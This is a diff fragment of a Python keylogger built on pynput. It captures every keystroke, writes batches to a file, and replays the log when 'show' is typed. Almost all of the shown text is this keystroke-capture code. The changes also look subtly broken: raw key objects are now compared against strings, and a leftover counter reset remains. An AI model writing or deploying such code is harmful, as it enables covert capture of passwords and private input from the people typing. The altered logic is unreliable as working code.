@@ -4,23 +4,19 @@ from pynput.keyboard import Key, Listener
 import datetime
 import time
 
-count = 0
 pressed_keys = []
 log_dict = {}
 
 def on_press(key):
-    global pressed_keys, count
+    global pressed_keys
 
-    pressed_keys.append(str(key))
-    print(pressed_keys[-4:])
+    pressed_keys.append(key)
+    # print(pressed_keys[-4:])
     if pressed_keys[-4:] == ["'s'","'h'","'o'","'w'"]:
         for time, value in log_dict.items():
              print(time + '\n' + '  ' + value)
 
-    count += 1
-    # print('{0} pressed', format(key))
-
-    if count >= 10:
+    if len(pressed_keys) >= 10:
         count = 0
         write_file(pressed_keys)
         pressed_keys = []
@@ -35,8 +31,8 @@ def write_file(keys):
         k = str(key).replace("'","")
 
         if k.find('backspace') > 0:
-                # print('back')
                 data_str = data_str[:-1]
+                k=''
         if k.find('space') > 0:
                 data_str += ' '
         elif k.find('Key') == -1:
